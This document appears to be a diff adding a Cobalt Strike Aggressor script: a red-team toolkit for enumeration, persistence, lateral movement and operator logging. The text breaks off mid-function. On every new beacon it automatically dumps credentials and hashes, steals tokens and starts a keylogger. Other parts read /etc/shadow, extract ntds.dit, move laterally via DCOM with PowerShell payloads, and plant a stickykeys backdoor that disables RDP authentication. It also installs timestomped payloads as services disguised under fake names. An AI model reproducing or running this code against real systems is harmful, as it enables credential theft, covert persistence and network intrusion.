@@ -1,0 +1,1420 @@
+#Persistence, Enumeration, Lateral Movement and Logging Aggressor Script
+#Author: @Qu1nn
+#References: @mattifestation, @rsmudge, @enigma0x3, @harmj0y, PowerShell Mafia folks, Nathan Wray, @Und3rFl0w, @oldb00t, bluescreenofjeff
+#Big thanks to Brain Campbell for getting me started with Cortana/Aggressor scripting!!
+#All in One v1
+#
+#
+# 
+#	TO DO: Add in Custom Reporting to a .csv that exports Beacon Logs to each Operator and the commands ran.
+#	TO DO: Add in Payload Generation for Persistence Menu Options
+#	TO DO: Add in HeartBeat Monitor to check for Dead Beacons...If last callback time is > 24h then create an event log entry
+#	TO DO: Add in Custom output for Net sessions/Net user "domain admins" /domain/netstat connections
+#	TO DO: Easy to use Registry Editor using command line. (PowerShell)
+#	TO DO: Add in Reverse Brute Force Script based on net user.
+#
+#
+##Update 2/22/17: Added DCOM Lateral Movement and removed Hyperion Persistence
+##Update 2/23/17: Added Color Coded Process List
+##Update 2/27/17: Added Admin/User level menus for Persistence
+##Update 3/1/17: Added Conditional Statements for the Script Kiddies
+##Update 3/10/17: Added Elevate Kit
+##Update 3/26/17: Added Ctrl+1 keybinding to open the Beacon Browser in a seperate window. Thanks @raffi!
+##Update 3/28/17: Added Registry RunKeys alias
+##Update 3/30/17: Added Sleep Timer. Thanks to bluescreenofjeff for source code. 
+##Update 3/30/17: Added Task All menu with Execute Shell Command to ALL Beacons. Thanks to @noone for assistance.
+##Update 3/30/17: Added Custom Aliases and Beacon Commands to Task All menu. Updated on beacon_initial.
+##Update 4/3/17: Added Topscan Alias. Scans the most common ports in a network.
+##Update 4/3/17: Added Find-Files Alias. Thanks to Joe Vest for POC script.
+##Update 4/4/17: Updated Enumeration Alias.
+##Update 4/5/17: Updated Wmic_Enum Alias.
+##Update 4/6/17: Added mimikatz-timestamp sub function. Thanks to bluescreenofjeff for source code.
+
+# needed imports for custom menu creation
+import java.awt.*; # for borderlayout
+import javax.swing.*; # for jpanel
+import javax.swing.table.*; #tablerowsorter
+import table.*; # generictablemodel
+import ui.*; #atable
+
+import javax.swing.JPanel;
+import java.awt.GridLayout;
+import javax.swing.JScrollPane;
+import javax.swing.JTextArea;
+import javax.swing.JSpinner;
+import javax.swing.JTextPane;
+import javax.swing.JButton;
+import javax.swing.GroupLayout;
+import javax.swing.GroupLayout.*;
+import javax.swing.BoxLayout;
+import javax.swing.JLabel;
+import javax.swing.ScrollPaneConstants;
+import javax.swing.JTextField;
+import java.awt.FlowLayout;
+import javax.swing.SpinnerNumberModel;
+import javax.swing.JCheckBox;
+import java.awt.Font;
+
+#Custom Directories for logging
+mkdir("/opt/cobaltstrike/logs/operator_logs");
+mkdir("/opt/cobaltstrike/logs/operator_logs/beacon_output");
+mkdir("/opt/cobaltstrike/logs/operator_logs/operator_input");
+
+bind Ctrl+1 { openBeaconBrowser(); }
+
+#Global sleep settings for sleep timer
+global('%sleepsettings');
+%sleepsettings["sleep"] = "60";
+%sleepsettings["jitter"] = "5";
+%sleepsettings["heartbeat"] = "False";
+%sleepsettings["enabled"] = "False";
+%sleepsettings["from_h"] = "20";
+%sleepsettings["from_m"] = "00";
+%sleepsettings["to_h"] = "06";
+%sleepsettings["to_m"] = "00";
+
+#Task All Menu
+menubar("Task All", "taskall", 2);
+popup taskall {
+	item "&Execute Shell Command to ALL Beacons" {
+	local('$bid');
+	prompt_text("What shell command do you want to send to ALL beacons?\n", "dir c:\\, netstat -ano", {
+		if($1 eq "") {
+			show_message("You didn't input a command. Exiting...");
+			break;
+		}
+		foreach $id (beacon_ids()) {	
+			bshell($id, "$1");
+			}
+		});
+	}
+	#Beacon Commands
+	menu "&Beacon Commands" {
+		item "&Task checkin Command to ALL Beacons" {
+			foreach $id (beacon_ids()) {
+				binput($id, "\cBTasked Beacon to 'checkin'");
+				bcheckin($id);
+			}
+		}
+		item "&Task ps Command to ALL Beacons" {
+			foreach $id (beacon_ids()) {
+				binput($id, "\cBTasked Beacon to 'ps'");
+				bps($id);
+			}
+		}
+		item "&Task rev2self Command to ALL Beacons" {
+			foreach $id (beacon_ids()) {
+				binput($id, "\cBTasked Beacon to 'rev2self'");
+				brev2self($id);
+			}
+		}
+		item "&Task exit Command to ALL Beacons" {
+			foreach $id (beacon_ids()) {
+				binput($id, "\cBTasked Beacon to 'exit'");
+				bexit($id);
+			}
+		}
+		item "&Task drives Command to ALL Beacons" {
+			foreach $id (beacon_ids()) {
+				binput($id, "\cBTasked Beacon to list 'drives'");
+				bdrives($id);
+			}
+		}
+	}
+	#Aliases
+	menu "&Custom Aliases" {
+		item "&Fire Alias Enumerate to ALL Beacons" {
+			foreach $id (beacon_ids()) {
+				binput($id, "\cBTasked Beacon to Fire Alias 'Enumerate'");
+				fireAlias($id, "Enumerate");
+			}
+		}
+		item "&Fire Alias NTDS_Extract to ALL Beacons" {
+			foreach $id (beacon_ids()) {
+				binput($id, "\cBTasked Beacon to Fire Alias 'NTDS_Extract'");
+				fireAlias($id, "NTDS_Extract");
+			}
+		}
+		item "&Fire Alias PowerUp to ALL Beacons" {
+			foreach $id (beacon_ids()) {
+				binput($id, "\cBTasked Beacon to Fire Alias 'PowerUp'");
+				fireAlias($id, "PowerUp");
+			}
+		}
+		item "&Fire Alias Release_The_Hounds to ALL Beacons" {
+			foreach $id (beacon_ids()) {
+				binput($id, "\cBTasked Beacon to Fire Alias 'Release_The_Hounds'");
+				fireAlias($id, "Release_The_Hounds");
+			}
+		}
+		item "&Fire Alias RunKeys to ALL Beacons" {
+			foreach $id (beacon_ids()) {
+				binput($id, "\cBTasked Beacon to Fire Alias 'RunKeys'");
+				fireAlias($id, "RunKeys");
+			}
+		}
+		item "&Fire Alias Windows_Survey to ALL Beacons" {
+			foreach $id (beacon_ids()) {
+				binput($id, "\cBTasked Beacon to Fire Alias 'Windows_Survey'");
+				fireAlias($id, "Windows_Survey");
+			}
+		}
+		item "&Fire Alias Wmic_Enum to ALL Beacons" {
+			foreach $id (beacon_ids()) {
+				binput($id, "\cBTasked Beacon to Fire Alias 'Wmic_Enum'");
+				fireAlias($id, "Wmic_Enum");
+			}
+		}
+		item "&Fire Alias Wmic_Patches to ALL Beacons" {
+			foreach $id (beacon_ids()) {
+				binput($id, "\cBTasked Beacon to Fire Alias 'Wmic_Patches'");
+				fireAlias($id, "Wmic_Patches");
+			}
+		}
+	}
+}
+
+global(@avlist);
+
+set BEACON_INPUT {
+    $bd = bdata($1);
+    if ($2 eq mynick()) {
+        return "\U" . mynick() . "\U" . "\U[" . $bd['computer'] . "]" . $bd['user'] . "/" . $bd['pid'] . "|" . tstamp(ticks()) . "\o> $3";
+    } else {
+        return "\U" . mynick() . "\U" . "$2 \U[" . $bd['computer'] . "]" . $bd['user'] . "/" . $bd['pid'] . "|" . tstamp(ticks()) ."\o> $3";
+    }
+}
+
+on beacon_input {
+	$bd = bdata($1);
+	local('$in');
+
+	if($2 eq mynick()) {
+		$in = openf(">>/opt/cobaltstrike/logs/operator_logs/operator_input/" . formatDate($4, 'yyyyMMMdd') . "_" . mynick() . ".log");
+
+		writeb($in, mynick() . "[" . $bd['internal'] . "_" . $bd['computer'] . "]" . $bd['user'] . "/" . $bd['pid'] . "|" . tstamp(ticks()) . "> $3" . "\n");
+
+		closef($in);
+	}
+}
+
+on beacon_output {
+	$bd = bdata($1);
+	local('$out');
+
+	$out = openf(">>/opt/cobaltstrike/logs/operator_logs/beacon_output/" . formatDate($3, 'yyyyMMMdd') . "_" . $bd['internal'] . "_" . $bd['computer'] . "_output.log");
+
+	println($out, mynick() . "[" . $bd['computer'] . "]" . $bd['user'] . "/" . $bd['pid'] . "|" . tstamp(ticks()) . "\n");
+	println($out, "$2" . "\n");
+
+	closef($out);
+}
+
+# output for the ps command too
+set BEACON_OUTPUT_PS {
+
+	$bd = bdata($1);
+	$handle = openf(script_resource("av_hips_executables.txt"));
+
+	while $line (readln($handle)) {
+		push(@avlist,$line);
+	}
+
+	local('$out $temp $name $ppid $pid $arch $user $session @ps');
+	$out .= "\cC[*]\o Process List with process highlighting of AV/HIPS, Browsers, Explorer/Winlogon, current processes\n";
+	$out .= "\cC[*]\o Current Running PID: \c8 Yellow \o \n";
+	$out .= "\cC[*]\o AV/HIPS: \c4 RED \o \n";
+	$out .= "\cC[*]\o Browsers: \c3 GREEN \o \n";
+	$out .= "\cC[*]\o Explorer/Winlogon: \c2 BLUE \o \n\n";
+	$out .= " PID   PPID  Name                         Arch  Session     User\n";
+	$out .= "\cE ---   ----  ----                         ----  -------     -----\n";
+
+	foreach $temp (split("\n", ["$2" trim])) {
+		($name, $ppid, $pid, $arch, $user, $session) = split("\t", $temp);
+
+
+		# highlight AV processes in RED.
+		if(iff($name in @avlist,true,false)) {
+		push(@ps, %(pid => $pid, entry => "\c4 $[5]pid $[5]ppid $[28]name $[5]arch $[11]session $user \o"));
+
+		# highlight explorer , winlogon in BLUE 
+		} else if ($name eq "explorer.exe" || $name eq "winlogon.exe") {
+		push(@ps, %(pid => $pid, entry => "\c2 $[5]pid $[5]ppid $[28]name $[5]arch $[11]session $user \o"));
+
+		# highlight browsers processes in GREEN
+		} else if ($name eq "chrome.exe" || $name eq "firefox.exe" || $name eq "iexplore.exe") {
+		push(@ps, %(pid => $pid, entry => "\c3 $[5]pid $[5]ppid $[28]name $[5]arch $[11]session $user \o"));
+
+		# highlight current process in YELLOW
+		} else if ($pid eq $bd['pid']) {
+		push(@ps, %(pid => $pid, entry => "\c8 $[5]pid $[5]ppid $[28]name $[5]arch $[11]session $user \o"));
+
+		} else {
+		push(@ps, %(pid => $pid, entry => " $[5]pid $[5]ppid $[28]name $[5]arch $[11]session $user"));
+
+		}
+
+	}
+
+	# sort the processes please
+	sort({ return $1['pid'] <=> $2['pid']; }, @ps);
+
+	# append to our outstring
+	foreach $temp (@ps) {
+
+		$out .= "$temp['entry'] \n";
+
+		}
+
+	return $out;
+}
+
+sub getexplorerpid {
+  bps($1, lambda({
+    local('$pid $name $entry');
+    foreach $entry (split("\n", $2)) {
+      ($name, $ppid, $pid, $arch) = split("\\s+", $entry);
+      println($entry);
+      # println("Name: $name PID: $pid ");
+      if ($name eq "explorer.exe") {
+        # $1 is our Beacon ID, $pid is the PID of explorer.exe
+        [$callback: $1, $pid];
+      }
+    }
+  }, $callback => $2));
+}
+
+on beacon_initial {
+
+	$user = beacon_data($1) ["user"];
+	$arch = beacon_data($1) ["barch"];
+	binput($1, "\cCNew $arch bit Beacon!");
+	binput($1, "\cCTaking a Screenshot");
+	binput($1, "\cCPriting Working Directory");
+	binput($1, "\cCQuerying PowerShell Version");
+	binput($1, "\cCExecuted 'set'");
+	binput($1, "\cCSleeping for 60 Seconds");
+	binput($1, "\cCAutomatic Keylogger Activated");
+	bnote($1, "$arch bit");
+	blog($1, "\c9Use the 'clear' command to cancel everything in queue.");
+	bpwd!($1);
+	bscreenshot!($1, 0);
+	bpowerpick!($1, '$PSVersionTable');
+	bshell!($1, 'set');
+	bsleep!($1, 60);
+
+	if (right("$user", 1) eq "*") {
+
+		blog($1, "\cCYou are SYSTEM!");
+		binput($1, "\cC====Dumping Credentials and Hashes====");
+		blogonpasswords!($1);
+		bhashdump!($1);
+		
+	}
+	else {
+		berror($1, "\c4You are NOT SYSTEM!! Try Harder!");
+		blog($1, "\c9Beacon is $arch bit. Only use $arch bit exploits for Privilege Escalation!!!");
+	}
+
+	#Auto Key Logger
+	getexplorerpid($1, {
+		if ($arch eq "x64") {
+			bsteal_token($1, int($2));
+    		bkeylogger($1, $2, "x64");
+    		blog($1, "\c4New Token may contain lower privleges. Use 'rev2self' for original token. Keylogger will stay active.");
+    		blog($1, "\c4Utilize Jobs/Jobkill to kill the new Keylogger");
+		}
+    	else {
+    		bsteal_token($1, int($2));
+    		bkeylogger($1, $2, "x86");
+    		blog($1, "\c4New Token may contain lower privleges. Use 'rev2self' for original token. Keylogger will stay active.");
+    		blog($1, "\c4Utilize Jobs/Jobkill to kill the new Keylogger");	
+    	}
+    });
+
+}
+
+#SSH Sessions
+
+on ssh_initial {
+   if (-isadmin $1) {
+   		binput($1, "===cat /etc/shadow,/etc/passwd===");
+      	bshell($1, "cat /etc/shadow");
+      	bshell($1, "cat /etc/passwd");
+      	#bshell($1, "for i in $(cat /etc/passwd | awk -F : '{if ($3 > 999 && $3 < 60001) print $1}'); do id $i; done && (cat /etc/passwd | awk -F : '{if ($3 > 999 && $3 < 60001) print $1,$2,$3,$4,$6,$7}'");
+   }
+   else {
+   		berror($1, "\c4You are not root! Try Harder ;)");
+   }
+}
+
+#SSH Survey command register
+
+ssh_command_register(
+	"Survey", 
+	"Runs a quick survey of the ssh client", 
+	"Syntax: Survey");
+
+#SSH Survey Alias
+
+ssh_alias Survey {
+
+	bshell($1, "cat /etc/*-release | grep -E '\"NAME=\"|ID|VERSION|ID_LIKE'");
+	bshell($1, "last -a");
+  	bshell($1, "uname -a");
+  	bshell($1, "uname -mrs");
+  	bshell($1, "id");
+	bshell($1, "history");
+	bshell($1, "arp -a");
+	bshell($1, "netstat -anot");
+	bshell($1, "ps -elf");
+	bshell($1, "ps -elf | grep root");
+	bshell($1, "ls -la /var/www/html/");
+	bshell($1, "service apache2 status");
+	bshell($1, "cat /etc/resolv.conf");
+	bshell($1, "cat /etc/networks");
+	bshell($1, "iptables -L");
+	bshell($1, "lsof -i");
+	bshell($1, "grep 80 /etc/services");
+	bshell($1, "w");
+	bshell($1, "route -n");
+	#bshell($1, "cat /etc/passwd | awk -F : '{if ($3 > 999 && $3 < 60001) print $1,$3,$6}'");
+
+}
+
+
+#Enumerate command register
+
+beacon_command_register("Enumerate", "Enumerate target with multiple net commands",
+	"Syntax: Enumerate\n" .
+	"\nEnumerate target with multiple net commands" .
+	"\narp -a, netstat, net view, net group, net user, net localgroup, net use, net share, whoami, process list, systeminfo",);
+
+##Basic Enumeration Alias
+alias Enumerate {
+
+	binput($1, "Basic Enumeration");
+	binput($1, "=================");
+	binput($1, "===Arp -a===");
+	bshell!($1, 'arp -a');
+	binput($1, "===Netstat -ano===");
+	bshell!($1, 'netstat -ano');
+	binput($1, "===Net View===");
+	bshell!($1, 'net view');
+	binput($1, "===Net Group Domain Admins===");
+	bshell!($1, 'net group "domain admins" /domain');
+	binput($1, "===Net Share===");
+	bshell!($1, 'net share');
+	binput($1, "===Net Use===");
+	bshell!($1, 'net use');
+	binput($1, "===Net User===");
+	bshell!($1, 'net user');
+	binput($1, "===Ipconfig /all===");
+	bshell!($1, 'ipconfig /all');
+	binput($1, "===Whoami /groups===");
+	bshell!($1, 'whoami /groups');
+	binput($1, "===Net localgroup===");
+	bshell!($1, 'net localgroup');
+	binput($1, "===Net localgroup administrators===");
+	bshell!($1, 'net localgroup "administrators"');
+	binput($1, "===Net dclist===");
+	bnet!($1, "dclist");
+	binput($1, "===Process List===");
+	binput($1, "===System Info===");
+	bps($1);
+	bshell!($1, 'systeminfo');
+
+
+}
+
+#Enumerate command register
+
+beacon_command_register("Wmic_Enum", "Enumerate target with multiple wmic commands in htable format",
+	"Syntax: Wmic_Enum\n" .
+	"\nEnumerate target with multiple wmic commands in htable format" .
+	"\nProcess List, Services, UserAccounts, groups, NIC Configuration, Local and Network Drives" .
+	"\nMapped Drives, Hotfixes Installed, Startup, Applications Installed, Detailed OS Information, Timezone Information.",);
+
+##Basic Wmic_Enum Alias
+alias Wmic_Enum {
+
+	binput($1, "wmic Enumeration");
+	binput($1, "===================");
+	binput($1, "wmic computersystem");
+	binput($1, "wmic desktop");
+	binput($1, "wmic netlogin");
+	binput($1, "wmic process");
+	binput($1, "wmic service");
+	binput($1, "wmic volume");
+	binput($1, "wmic netuse");
+	binput($1, "wmic startup");
+	binput($1, "wmic PRODUCT");
+	bsleep($1, 60, 0);
+	blog($1, "\cCAll wmic commands listed above are executing and saving to file wmic_output.html....Download when finished.");
+	bshell!($1, 'wmic computersystem get Name,domain,NumberofProcessors,Roles,totalphysicalmemory /format:htable > wmic_output.html');
+	bshell!($1, 'wmic desktop get Name,ScreenSaverActive,Wallpaper /format:htable >> wmic_output.html');
+	bshell!($1, 'wmic netlogin get Caption,Privileges,UserID,UserType,NumberOfLogons,PasswordAge,LogonServer,Workstations /format:htable >> wmic_output.html');
+	bshell!($1, 'wmic process get CSName,Description,ExecutablePath,ProcessId /format:htable >> wmic_output.html');
+	bshell!($1, 'wmic service get Caption,Name,PathName,ServiceType,Started,StartMode,StartName /format:htable >> wmic_output.html');
+	bshell!($1, 'wmic volume get Label,DeviceID,DriveLetter,FileSystem,Capacity,FreeSpace /format:htable >> wmic_output.html');
+	bshell!($1, 'wmic netuse list full /format:htable >> wmic_output.html');
+	bshell!($1, 'wmic startup get Caption,Command,Location,User /format:htable >> wmic_output.html');
+	bshell!($1, 'wmic PRODUCT get Description,InstallDate,InstallLocation,PackageCache,Vendor,Version /format:htable >> wmic_output.html');
+
+}
+
+#wmic_patches command register
+beacon_command_register("Wmic_Patches", "Enumerate all current KB articles installed in table format",
+	"Syntax: Wmic_Patches\n" .
+	"\nEnumerate all the current patches installed with wmic.",);
+
+#Wmic Patch Information
+alias Wmic_Patches {
+
+	bsleep($1, 60, 0);
+	bshell($1, 'wmic qfe get HotFixID,InstalledOn');
+}
+
+#BloodHound command register
+beacon_command_register("Release_The_Hounds", "Imports BloodHound.ps1 and Exports into .csv format",
+	"Syntax: Release_The_Hounds\n" .
+	"Releases the Hounds ;)",);
+
+#BloodHound Alias
+alias Release_The_Hounds {
+
+	if (-exists script_resource("scripts/BloodHound.ps1")) {
+		bpowershell_import($1, script_resource("scripts/BloodHound.ps1"));
+		bpowerpick($1, "Run-BloodHound");
+		blog($1, "****Download All CSV Files After Execution****");
+	}
+	else {
+		berror($1, "\c4BloodHound.ps1 does not exist!!");
+	}
+}
+
+#PowerUp command register
+beacon_command_register("PowerUp", "Imports PowerUp.ps1 and Calls the Invoke-AllChecks Function",
+	"Syntax: PowerUp");
+
+#PowerUp All Checks
+alias PowerUp {
+
+	if (-exists script_resource("scripts/PowerUp.ps1")) {
+		bpowershell_import($1, script_resource("scripts/PowerUp.ps1"));
+		bpowershell($1, "Invoke-AllChecks");
+	}
+	else {
+		berror($1, "\c4PowerUp.ps1 does not exist!!");
+	}
+}
+
+#NTDS_Extract command register
+beacon_command_register("NTDS_Extract", "Creates a volume shadow copy and extracts the ntds.dit and SYSTEM file into C:\\Temp",
+	"Syntax: NTDS_Extract\n" .
+	"*Must be running as an Administrator\n" .
+	"*Must have updated Invoke-NinjaCopy.ps1 script");
+
+#NTDS_Extract
+alias NTDS_Extract {
+
+	if (-exists script_resource("scripts/Invoke-NinjaCopy.ps1")) {
+		bpowershell_import($1, script_resource("scripts/Invoke-NinjaCopy.ps1"));
+		bpowerpick($1, 'Invoke-NinjaCopy -Path "C:\Windows\ntds\ntds.dit" -LocalDestination "C:\Windows\temp\ntds.dit"');
+		bpowerpick($1, 'Invoke-NinjaCopy -Path "C:\Windows\system32\config\SYSTEM" -LocalDestination "C:\Windows\temp\SYSTEM"');
+		bshell($1, 'dir /a C:\Windows\temp\\');
+	}
+	else {
+		berror($1, "\c4Invoke-NinjaCopy.ps1 does not exist!!");
+	}
+}
+
+#Windows Survey Command Register
+beacon_command_register("Windows_Survey", "Runs the Windows Survey v1.5 Script made by Chris Cottrell",
+	"Syntax: Windows_Survey\n" .
+	"*Execute the sclean.sh script with the automated survey string after\n" .
+	"*Must have updated Windows_Survey_1_5.ps1 script");
+
+#Windows Survey Alias
+alias Windows_Survey {
+
+	if (-exists script_resource("scripts/Windows_Survey_1_5.ps1")) {
+		bpowershell_import($1, script_resource("scripts/Windows_Survey_1_5.ps1"));
+		bpowerpick($1, 'Get-Survey');
+		blog($1, "\c9Run ./sclean.sh (Survey String) in the /opt/cobaltstrike/scripts directory after all data is pulled")
+	}
+	else {
+		berror($1, "\c4Windows_Survey_1_5.ps1 does not exist!!");
+	}
+
+}
+
+#RunKeys Command Register
+beacon_command_register("RunKeys", "Queries the Registry for all the Runkeys on startup",
+	"Syntax: RunKeys\n" .
+	"Checks HKLM and HKCU for All RunKeys in the Registry");
+
+#RunKeys Alias
+alias RunKeys {
+	
+	bshell($1, 'reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"');
+	bshell($1, 'reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce"');
+	bshell($1, 'reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx"');
+	bshell($1, 'reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"');
+	bshell($1, 'reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce"');
+
+}
+
+#Topscan register help
+beacon_command_register("Topscan", "portscans top common ports with arp discovery",
+	"Syntax: Topscan [target]\n\n" .
+	"Scans top common ports with the command: portscan [targets] arp\n\n" .
+	"[targets] is a comma separated list of hosts to scan. You may also specify\n" .
+	"IPv4 address ranges (e.g., 192.168.1.128-192.168.2.240, 192.168.1.0/24)\n");
+
+#Topscan alias
+alias Topscan {
+	if ($2 != $null) {
+		binput("portscan $1 21,22,23,25,80,443,8080,8443,445,3389 arp");
+		bportscan($1, $2, "21,22,23,25,80,443,8080,8443,445,3389", "arp");
+	}
+	else {
+		berror($1, "\c4You must specify a Target IP!");
+		blog($1, "\c9Example: Topscan [Target IP]");
+	}
+}
+
+#Find-Files register help
+beacon_command_register("Find-Files", "Searches through a location for filetypes specified by the user",
+	"Syntax: Find-Files [Location] [File Types]\n" .
+	"Example: Find-Files C:\\Users\\user1\\Desktop\\ *.txt,*assword*\n\n" .
+	"\c9**Note: Multiple File Types are comma seperated with no spaces\n" .
+	"\c9**Note: Recommended location spots (User Desktops, Mapped Shares, Share Drives)\n" .
+	"\c9**Note: Don't search through entire root of C:\\ (Would create a long search with too much output)\n");
+
+#Find-Files Alias
+alias Find-Files {
+	binput($1, "Executing Find-Files....");
+	if (-exists script_resource("scripts/Find-Files.ps1" & $2 != $null & $3 != $null)) {
+		bpowershell_import!($1, script_resource("scripts/Find-Files.ps1"));
+		bpowerpick!($1, 'Find-Files -searchBase "'.$2.'" -searchTerms "'.$3.'"');
+	}
+	else {
+		berror($1, "\c4Find-Files.ps1 does not exist or missing arguments!!");
+		blog($1, "\c9Example: Find-Files C:\\Users\\user1\\Desktop\\ *.txt,*assword*");
+	}
+}
+
+# Thanks to Mudge for coding this lateral movement technique
+# com-exec Lateral Movement alias
+# https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/
+
+# register help for our alias
+beacon_command_register("com-exec", "lateral movement with DCOM",
+	"Synopsis: com-exec [target] [listener]\n\n" .
+	"Run a payload on a target via DCOM MMC20.Application Object");
+
+# here's our alias to collect our arguments
+alias com-exec {
+	if ($3 is $null) {
+		# let the user choose a listener
+		openPayloadHelper(lambda({
+			com_exec_go($bid, $target, $1);
+		}, $bid => $1, $target => $2));
+	}
+	else {
+		# we have the needed arguments, pass them
+		com_exec_go($1, $2, $3);
+	}
+}
+
+# this is the implementation of the attack
+sub com_exec_go {
+	local('$command $script $oneliner');
+
+	# check if our listener exists
+	if (listener_info($3) is $null) {
+		berror($1, "\c4Listener $3 does not exist");
+		return;
+	}
+
+	# state what we're doing.
+	btask($1, "Tasked Beacon to jump to $2 (" . listener_describe($3, $2) . ") via DCOM");
+
+	# generate a PowerShell one-liner to run our alias	
+	$command = powershell($3, true, "x86");
+
+	# remove "powershell.exe " from our command
+	$command = strrep($command, "powershell.exe ", "");
+
+	# build script that uses DCOM to invoke ExecuteShellCommand on MMC20.Application object
+	$script  = '[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "';
+	$script .= $2;
+	$script .=  '")).Document.ActiveView.ExecuteShellCommand("';
+	$script .= 'c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe';
+	$script .= '", $null, "';
+	$script .= $command;
+	$script .= '", "7")';
+
+	# run the script we built up
+	bpowershell!($1, $script);
+	
+	# complete staging process (for bind_pipe listeners)
+	bstage($1, $2, $3);
+}
+
+popup beacon_top {
+	menu "&Red Team"{
+# Persistence Menu		
+		menu "&Persistence" {
+			menu "&Admin Level"{
+				item "&Persist (Workstation) HTTPS" {
+					local('$bid');
+					foreach $bid ($1) {
+						persistWorkstation($bid);
+					}
+				}
+				#item "&Persist (Hyperion DLL 443 64 Bit Server2000+) (HTTPS)" {
+					#local('$bid');
+					#foreach $bid ($1) {
+						#HyperionDLL443_x64_2000Plus($bid);
+					#}
+				#}
+				item "&Persist (Server) HTTPS" {
+					local('$bid');
+					foreach $bid ($1) {
+						persistServer($bid);
+					}
+				}
+				item "&Persist (Server SMB Only)" {
+					local('$bid');
+					foreach $bid ($1) {
+						persistSmbOnly($bid);
+					}
+				}
+				item "&WMI Event using PowerPick" {
+					local('$bid');
+					foreach $bid ($1) {
+						persistwmievent($bid);
+					}
+				}
+				item "&WMI Event using WMIC" {
+					local('$bid, $enc');
+					foreach $bid ($1) {
+						#$enc is base 64 encoded IEX of the powershell one liner
+						#cat payload.txt | iconv --to-code=UTF-16LE | base64
+						$enc = "";
+						persistwmieventwmic($bid, $enc);
+					}
+				}
+			}
+			menu "&User Level" {	
+				item "&WindowsStartup"{
+					local('$bid');
+					foreach $bid ($1) {
+						persistThroughStartUpFolder($bid);
+					}
+				}
+				item "&Stickykeys(OSK)" {
+					local('$bid');
+					foreach $bid ($1) {
+						stickykeys($bid);
+					}
+				}
+				item "&Schtasks User Onlogon" {
+					local('$bid');
+					foreach $bid ($1) {
+						persistUserSchtasks($bid);
+					}
+				}
+			}
+		}
+	}
+}
+
+##### Persist
+
+sub stickykeys {
+	bshell($1, 'REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f');
+	bshell($1, 'REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v Debugger /t REG_SZ /d "c:\windows\system32\cmd.exe"');
+	bshell($1, 'REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d "0" /f');
+	bshell($1, 'netsh firewall set service type = remotedesktop mode = enable');
+	bshell($1, 'netsh advfirewall firewall set rule group="remote desktop" new enable=Yes');
+	bshell($1, 'net start TermService');
+}
+
+#sub HyperionDLL443_x64_2000Plus {
+	# cd to System32
+	#bcd($1, 'c:\windows\system32');
+
+	# on boot Point to and Load hp DLL
+	#bupload($1, '/opt/cobaltstrike/Payloads/RunConsoleDll.exe');
+	#bupload($1, '/opt/cobaltstrike/Payloads/hpbcfgui.dll');
+	#btimestomp($1, "hpbcfgui.dll", "autoplay.dll");
+	#bshell($1, 'RunConsoleDll.exe hpbcfgui.dll');
+	#bshell($1, 'wmic process where name="RunConsoleDll.exe" call terminate');
+	#bshell($1, 'del RunConsoleDll.exe');
+	#bshell($1, 'del hpbcfgui.dll');
+#}
+
+sub persistUserSchtasks {
+
+	if (-exists script_resource("Payloads/AdobeArm.dll")) {
+		bcd($1, 'C:\Users\Default\AppData\\');
+		#upload HTTPS payload
+		bupload($1, '/opt/cobaltstrike/Payloads/AdobeArm.dll');
+		bshell($1, 'schtasks /create /tn "Adobe Arm Updater" /tr "C:\Windows\System32\rundll32.exe C:\Users\Default\AppData\AdobeArm.dll,StartW" /sc onlogon');
+		bshell($1, 'schtasks /query /v /tn "Adobe Arm Updater" /FO list');
+		bshell($1, 'attrib +H AdobeArm.dll');
+	}
+	else {
+		berror($1, "\c4Payload does not exist!!");
+	}
+}
+
+
+sub persistServer {
+
+	if (-exists script_resource("Payloads/netsys.exe")) {
+		# Windows servers with HTTPS
+		bcd($1, 'c:\windows\system32');
+
+		# on boot [service exe]
+		bupload($1, '/opt/cobaltstrike/Payloads/netsys.exe');
+		btimestomp($1, "netsys.exe", "cmd.exe");
+		bshell($1, 'sc delete netsys');
+		bshell($1, 'sc create netsys binpath= "C:\windows\system32\netsys.exe" error= ignore start= auto DisplayName= "System Network Monitor"');
+		bshell($1, 'sc description netsys "Monitors the networks to which the computer has connected, collects and stores information about these networks, and notifies registered applications of state changes. If this service is disabled, any services that explicitly depend on it may fail to start."');
+		bshell($1, 'sc config netsys binpath= "C:\windows\system32\netsys.exe"');
+		bshell($1, 'sc start netsys');
+	}
+	else {
+		berror($1, "\c4Payload does not exist!!");
+	}
+}
+
+sub persistWorkstation {
+
+	if (-exists script_resource("Payloads/msrandr.exe")) {
+		# Windows workstations with HTTPS
+		bcd($1, 'c:\windows\system32');
+
+		# on boot [service exe]
+		bupload($1, '/opt/cobaltstrike/Payloads/msrandr.exe');
+		btimestomp($1, "msrandr.exe", "cmd.exe");
+		bshell($1, 'sc create winsrv binpath= "C:\windows\system32\msrandr.exe" start= auto DisplayName= "Desktop Window Service"');
+		bshell($1, 'sc description winsrv "Manages desktop sessions from this computer. If this service is disabled, any services that explicitly depend on it may fail to start."');
+		bshell($1, 'sc config winsrv binpath= "C:\windows\system32\msrandr.exe"');
+		bshell($1, 'sc start winsrv');
+	}
+	else {
+		berror($1, "\c4Payload does not exist!!");
+	}
+}
+
+sub persistSmbOnly {
+
+	if (-exists script_resource("Payloads/adsvc.exe")) {
+		bcd($1, 'c:\windows\system32');
+
+		#on boot [another service exe]
+		#SMB only for servers
+		bupload($1, '/opt/cobaltstrike/Payloads/adsvc.exe');
+		btimestomp($1, "adsvc.exe", "notepad.exe");
+		bshell($1, 'sc delete adsvc');
+		bshell($1, 'sc create adsvc binpath= "C:\windows\system32\adsvc.exe" error= ignore start= auto DisplayName= "Active Directory Server Service"');
+		bshell($1, 'sc description adsvc "Provides Active Directory services. If this service is stopped, programs that depend on Active Directory may not function properly."');
